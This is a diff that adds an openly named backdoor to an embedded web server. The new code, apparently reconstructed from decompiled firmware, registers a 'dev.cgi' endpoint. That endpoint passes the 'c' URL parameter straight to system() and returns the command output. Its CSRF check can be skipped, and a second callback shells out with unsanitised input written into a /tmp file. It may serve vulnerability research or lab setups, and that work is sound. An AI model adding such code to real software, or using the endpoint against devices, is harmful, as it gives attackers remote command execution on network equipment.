@@ -1,0 +1,261 @@
+--- a/backdoor.c
++++ b/backdoor.c
+@@ -0,0 +1,210 @@
++#include "backdoor.h"
++
++#include "cgi.h"
++#include "httpd.h"
++#include "user.h"
++
++#include <errno.h>
++#include <fcntl.h>
++#include <stdbool.h>
++#include <stdlib.h>
++#include <string.h>
++#include <sys/stat.h>
++#include <sys/types.h>
++#include <unistd.h>
++
++int CFG_DEV_MSG(char *cmd,
++                int (*func)(struct httpd_connexion *hc, int a, int b,
++                            char **param, size_t size),
++                struct httpd_connexion *hc) {
++  int __pid;
++  char *pcVar1;
++  FILE *__stream;
++  uint uVar2;
++  __fd_mask *p_Var3;
++  size_t sVar4;
++  int *piVar5;
++  int iVar6;
++  uint uVar7;
++  char *pcStack_d00;
++  char uStack_cfc[6];
++  struct timeval tStack_cf4;
++  char uStack_cec[36];
++  uint auStack_cc8[32];
++  uint auStack_c48[256];
++  char acStack_848[2048];
++  uint uStack_48;
++  uint uStack_44;
++  uint uStack_40;
++  __fd_mask *p_Stack_3c;
++  char **ppcStack_38;
++  struct timeval *ptStack_34;
++  int iStack_30;
++
++  uStack_cfc[0] = 'P';
++  uStack_cfc[1] = 'D';
++  uStack_cfc[2] = 'T';
++  uStack_cfc[3] = 'A';
++  uStack_cfc[4] = 'G';
++  uStack_cfc[5] = '\0';
++  pcVar1 = uStack_cec + 0xf;
++  memset(pcVar1, 0, 0x14);
++  uStack_cec[14] = '\0';
++  uStack_cec[0] = '/';
++  uStack_cec[1] = 't';
++  uStack_cec[2] = 'm';
++  uStack_cec[3] = 'p';
++  uStack_cec[12] = 'X';
++  uStack_cec[13] = 'X';
++  uStack_cec[8] = 'X';
++  uStack_cec[9] = 'X';
++  uStack_cec[10] = 'X';
++  uStack_cec[11] = 'X';
++  tStack_cf4.tv_usec = 0;
++  tStack_cf4.tv_sec = 5;
++  uStack_cec[4] = '/';
++  uStack_cec[5] = 'd';
++  uStack_cec[6] = 'e';
++  uStack_cec[7] = 'v';
++  pcStack_d00 = acStack_848;
++  if ((cmd != (char *)0x0) && (func != (void *)0x0)) {
++    pcVar1 = mktemp(uStack_cec);
++    if (pcVar1 != (char *)0x0) {
++      iVar6 = mkfifo(uStack_cec, 0x1c0);
++      if (-1 < iVar6) {
++        sprintf((char *)auStack_c48, "%s > %s 2>&1 &", cmd, uStack_cec);
++        system((char *)auStack_c48);
++        __stream = fopen(uStack_cec, "r");
++        if (__stream != (FILE *)0x0) {
++          uStack_48 = fileno(__stream);
++          uStack_44 = fcntl(uStack_48, 3);
++          if (-1 < (int)uStack_44) {
++            iVar6 = fcntl(uStack_48, 4, uStack_44 | 0x80);
++            if (-1 < iVar6) {
++              uVar2 = uStack_48 >> 5;
++              ppcStack_38 = &pcStack_d00;
++              uStack_40 = 1 << (uStack_48 & 0x1f);
++              p_Stack_3c = (__fd_mask *)auStack_cc8;
++              iStack_30 = uStack_48 + 1;
++              ptStack_34 = &tStack_cf4;
++              p_Var3 = p_Stack_3c;
++              while (true) {
++                do {
++                  *p_Var3 = 0;
++                  p_Var3 = p_Var3 + 1;
++                } while ((uint *)p_Var3 != auStack_c48);
++                auStack_cc8[uVar2] = auStack_cc8[uVar2] | uStack_40;
++                tStack_cf4.tv_sec = 8;
++                iVar6 = select(iStack_30, (fd_set *)p_Stack_3c, (fd_set *)0x0,
++                               (fd_set *)0x0, ptStack_34);
++                uVar7 = 0;
++                if (iVar6 < 1)
++                  break;
++                do {
++                  clearerr(__stream);
++                  sVar4 =
++                      fread(pcStack_d00 + uVar7, 1, 0x800 - uVar7, __stream);
++                  uVar7 = uVar7 + sVar4;
++                  if (0x7ff < uVar7)
++                    goto LAB_00022ed8;
++                  iVar6 = ferror(__stream);
++                } while ((iVar6 != 0) &&
++                         (piVar5 = __errno_location(), *piVar5 == 4));
++                if ((uVar7 == 0) &&
++                    ((iVar6 = ferror(__stream),
++                      iVar6 != 0 || (iVar6 = feof(__stream), iVar6 != 0))))
++                  break;
++              LAB_00022ed8:
++                func(hc, 0, 1, ppcStack_38, uVar7);
++                p_Var3 = p_Stack_3c;
++              }
++              iVar6 = fcntl(uStack_48, 4, uStack_44);
++              if (-1 < iVar6) {
++                iVar6 = 0;
++                goto LAB_00022b54;
++              }
++            }
++          }
++        }
++        piVar5 = __errno_location();
++        iVar6 = *piVar5;
++        goto LAB_00022b54;
++      }
++    }
++  }
++  __stream = (FILE *)0x0;
++  iVar6 = -1;
++LAB_00022b54:
++  if (__stream != (FILE *)0x0) {
++    fclose(__stream);
++  }
++  unlink(uStack_cec);
++  return iVar6;
++}
++
++int DAT_00458cd8 = 0;
++
++int FUN_0040c7f8(struct httpd_connexion *hc, int param_2, int param_3,
++                 char **param_4, size_t param_5) {
++  char *param3;
++  char acStack_d8[200];
++
++  param3 = *param_4;
++  fwrite(param3, 1, param_5, hc->out_stream);
++  printf("%s(%d) (%lu)\n", "_CB_DEV_CGI", 0x10ea, param_5);
++  if (DAT_00458cd8 != 0) {
++    param3[param_5] = '\0';
++    snprintf(acStack_d8, 200, "echo \"%s\" >> /tmp/%s", param3,
++             "firmware_ver.txt");
++    puts(acStack_d8);
++    system(acStack_d8);
++  }
++  return 0;
++}
++
++void cgi_dev(char *url, struct httpd_connexion *hc)
++
++{
++  bool bVar1;
++  char *pcVar2;
++  int iVar3;
++  int iVar4;
++  FILE *param0;
++  char acStack_410[1024];
++
++  param0 = hc->out_stream;
++  Slurp_buf_buf(hc);
++  send_ok(hc, url);
++  pcVar2 = strchr(url, '?');
++  if (pcVar2 == (char *)0x0)
++    goto LAB_0040c714;
++  strcpy(acStack_410, pcVar2 + 1);
++  init_cgi(acStack_410);
++  bVar1 = checkMPtest();
++  if (bVar1 == 0) {
++    pcVar2 = get_cgi("CSRFID");
++    if (pcVar2 == (char *)0x0) {
++      pcVar2 = "0";
++    }
++    iVar4 = atoi(pcVar2);
++    iVar3 = make_CSRFID(hc->ip_str);
++    if (iVar4 == iVar3)
++      goto LAB_0040c6cc;
++    init_cgi((char *)0x0);
++    iVar4 = -0x3e6;
++  } else {
++  LAB_0040c6cc:
++    iVar4 = 0;
++  }
++  pcVar2 = get_cgi("c");
++  if (pcVar2 != (char *)0x0) {
++    iVar4 = CFG_DEV_MSG(pcVar2, FUN_0040c7f8, hc);
++  }
++  if (iVar4 != 0) {
++    fprintf(param0, "ERR: %d", iVar4);
++    fflush(param0);
++  }
++LAB_0040c714:
++  init_cgi((char *)0x0);
++  return;
++}
+--- a/backdoor.h
++++ b/backdoor.h
+@@ -0,0 +1,8 @@
++#ifndef BACKDOOR_H
++#define BACKDOOR_H
++
++#include "httpd.h"
++
++void cgi_dev(char* url, struct httpd_connexion* hc);
++
++#endif /* ifndef BACKDOOR_H */
+--- a/CMakeLists.txt
++++ b/CMakeLists.txt
+@@ -14,7 +14,8 @@
+   nvram.c
+   mime_handlers.c
+   cgi.c
+-  script.c)
++  script.c
++  backdoor.c)
+ 
+ target_compile_options(httpd
+   PRIVATE
+--- a/mime_handlers.c
++++ b/mime_handlers.c
+@@ -5,6 +5,7 @@
+ #include "script.h"
+ #include "user.h"
+ #include "utils.h"
++#include "backdoor.h"
+ 
+ #include <stdio.h>
+ #include <stdlib.h>
+@@ -448,6 +449,14 @@
+                                            NULL,
+                                        },
+                                        {
++                                           "dev.cgi",
++                                           "text/plain",
++                                           no_cache,
++                                           NULL,
++                                           cgi_dev,
++                                           NULL,
++                                       },
++                                       {
+                                            NULL,
+                                            NULL,
+                                            NULL,
